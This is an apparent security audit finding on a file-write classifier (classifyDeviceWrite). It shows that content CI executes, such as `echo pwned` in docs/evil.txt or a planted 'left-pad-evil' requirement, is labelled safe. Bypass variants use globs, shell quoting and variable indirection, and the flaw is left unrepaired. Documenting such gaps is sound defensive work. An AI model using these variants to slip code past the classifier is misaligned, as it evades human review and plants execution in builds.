findings.reproduction: Project with .github/workflows/ci.yml containing `- run: for f in docs/*.txt; do sh "$f"; done`. Classify write docs/evil.txt, content `echo pwned`, base = project. Result PHONE_SAFE_DOCUMENT, reason 'plain document'. Variants that also return PHONE_SAFE: .gitlab-ci.yml with `- sh docs/'evil.txt'` (shell quote split); ci.yml with `env: D: docs` and `- run: sh "$D/x.txt"` (variable indirection); ci.yml with `- run: pip install -r docs/*.txt` and dest docs/deps.txt, content `left-pad-evil==1.0` (plain requirement lines pass INSTALLER_DIRECTIVE, which only catches flag lines).
findings.boundary: classifyDeviceWrite -> consumerOf needle matching: authorization.server.ts:574 (needles = destination tail and full relText) and :569 (plain substring test on the lowercased, slash-normalized text at :545-550). A consumer that names the destination through a glob, shell quoting, or a variable is not matched, so the destination falls through to PHONE_SAFE_DOCUMENT or PHONE_SAFE_DATA.
findings.repair: Not repaired. Mitigation: the change is still only staged; it reaches the project only when the Windows Host owner promotes the exact reviewed bytes, and the review shows the class and warnings.
